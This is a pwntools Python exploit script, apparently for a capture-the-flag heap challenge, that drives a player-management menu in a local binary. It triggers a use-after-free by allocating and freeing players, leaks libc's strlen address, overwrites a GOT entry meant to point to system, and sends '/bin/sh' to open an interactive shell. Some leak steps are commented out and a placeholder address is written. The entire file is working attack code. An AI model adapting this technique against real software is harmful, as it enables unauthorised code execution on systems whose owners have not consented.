from pwn import *

#p = process('./main.elf')
#p = gdb.debug('./main.elf', 'b *0x401793')
p = gdb.debug('./main.elf', 'b main')

context(os='linux', arch='amd64')
#context.log_level = 'DEBUG'

def Pause():
	log.success("Pausing...")
	raw_input()

def Allocate(name, attack = 1, defense = 2, speed = 3,precision = 4):

	log.success("Allocating Player")
	p.recvuntil("choice: ")
	p.sendline("1")

	p.recvuntil("name: ")
	p.sendline(name)

	p.recvuntil("points: ")
	p.sendline(str(attack))

	p.recvuntil("points: ")
	p.sendline(str(defense))

	p.recvuntil("speed: ")
	p.sendline(str(speed))

	p.recvuntil("precision: ")
	p.sendline(str(precision))

	p.recvuntil("choice:")
	p.sendline('6')


def Free(index):

	log.success("Freeing Player at index: " + str(index))
	p.recvuntil("choice:")
	p.sendline("2")
	p.recvuntil("index:")
	p.sendline(str(index))

def Select(index):
	log.success("Selecting Player at index: " + str(index))
	p.recvuntil("choice:")
	p.sendline("3")
	p.recvuntil("index:")
	p.sendline(str(index))

def Trigger():
	log.success("Triggering Use-After-Free")
	p.recvuntil("choice:")
	p.sendline('5')

def TriggerLeak():
	log.success("Triggering Use-After-Free")
	p.recvuntil("choice:")
	p.sendline('5')
	leak = p.recvline().split("Name: ")[1][:6].ljust(8, '\x00')
	log.success("Leaked STRLEN: " + str(leak))
	return u64(leak)

def Execute():

	log.success("Excuting /bin/sh")
	p.sendline("1")
	p.recvuntil("name:")
	p.sendline("/bin/sh")

def OverwriteGOT(address):

	log.success("Overwriting GOT")
	p.sendline("4")
	p.recvuntil("choice: ")
	p.sendline("1")
	p.recvuntil("name:")
	p.sendline(address)

def Exploit():

	log.success("Sending Exploit")

	player1 = "A" * 32
	player2 = "B" * 32
	player3 = "C" * 19
	strlen_addr = 0x603040
	main = 0x4021a1

	GOTentry = "D" * 16 + p64(main)
	libc_strlen = 0x8b720
	libc_system = 0x45390

	Allocate(player1)
	Allocate(player2)
	Select("1")
	Free("1")
	Free("0")
	Allocate(GOTentry)
	#leak = TriggerLeak()
	#libc_base = leak - libc_strlen
	#log.success("LIBCBASE: " + p64(libc_base))
	#system = libc_base + libc_system
	#log.success("SYSTEM: " + p64(system))
	#OverwriteGOT(p64(system))
	OverwriteGOT(p64(0x54545454))
	log.success("GOT Overwritten")
	Execute()
	p.interactive()

Exploit()